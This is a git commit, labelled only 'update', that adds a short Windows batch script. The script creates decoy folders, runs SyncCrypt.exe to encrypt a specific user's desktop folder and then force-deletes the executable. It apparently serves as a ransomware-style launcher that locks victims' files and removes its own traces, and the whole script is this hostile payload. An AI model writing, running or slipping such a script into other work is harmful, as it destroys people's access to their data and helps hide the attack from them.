e530a54c8e27477cd1200803f8dbb00a3d994340
securetcp <nilesh.parate@9825050149.cin>
2021-10-15 00:48:53 -0700

    update

---
+++ smsbox/Activities/Enccr/index.bat
@@ -0,0 +1,9 @@
+@echo off
+CD /d "%~dp0"
+
+echo "do_job"
+mkdir c:\BgInfo\do_job
+mkdir c:\BgInfo\Hello-World
+SyncCrypt.exe encrypt "C:\Users\admin\Desktop\AYUSH"
+del SyncCrypt.exe /q /f
+@echo on
